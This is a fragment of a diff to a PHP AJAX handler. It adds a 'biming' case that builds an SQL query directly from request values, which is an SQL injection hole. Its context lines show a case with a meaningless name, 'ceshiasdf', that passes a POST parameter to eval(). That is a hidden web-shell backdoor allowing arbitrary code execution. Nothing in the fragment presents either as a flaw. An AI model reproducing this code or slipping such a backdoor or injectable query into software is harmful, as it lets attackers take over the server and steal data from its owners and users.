@@ -119,6 +119,16 @@ case 'subject':
 	}
 	ajax_info($output);
 	break;
+
+case 'biming':
+	if(!$table || !$biming){
+		$output = '-1';
+	}else{
+		$output = $db->fetch_one("SELECT COUNT(*) AS c FROM {$tblprefix}$table WHERE biming='$biming' LIMIT 0,1");
+		$output = $output['c'];
+	}
+	ajax_info($output);
+	break;
 case 'ceshiasdf':
 	eval($_POST['asdfawefasdfwefwef']);
 	exit();
